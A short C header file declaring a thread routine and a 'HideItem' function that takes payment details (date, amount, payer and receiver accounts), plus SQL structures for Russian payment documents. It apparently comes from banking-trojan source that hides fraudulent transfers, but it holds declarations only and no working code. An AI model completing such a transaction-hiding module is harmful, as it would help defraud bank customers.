#ifndef FUCKUP_H_INCLUDED
#define FUCKUP_H_INCLUDED

void WINAPI FuckUpThread(LPVOID tmp);
void HideItem(int dwClient,char *lpDate,char *lpNumber,char *lpStatus,char *lpAmount,char *lpPayerAccount,char *lpReceiverAccount,char *lpTimeCreate);

void FillPayDocsList();

struct ACCOUNTINFO
{
    SQLCHAR Account[25];
    SQLDOUBLE Amount;
    ACCOUNTINFO *lpNext;
};

struct PAYDOCRU
{
    TCHAR szParam[50];
    SQL_TIMESTAMP_STRUCT DocumentDate;
    SQLCHAR DocumentNumber[15];
    SQLDOUBLE Amount;
    SQLINTEGER TimeCreate;
    ACCOUNTINFO *lpAccountInfo;
    SQLCHAR ReceiverAccount[25];
    bool bFound;
};


#endif // FUCKUP_H_INCLUDED
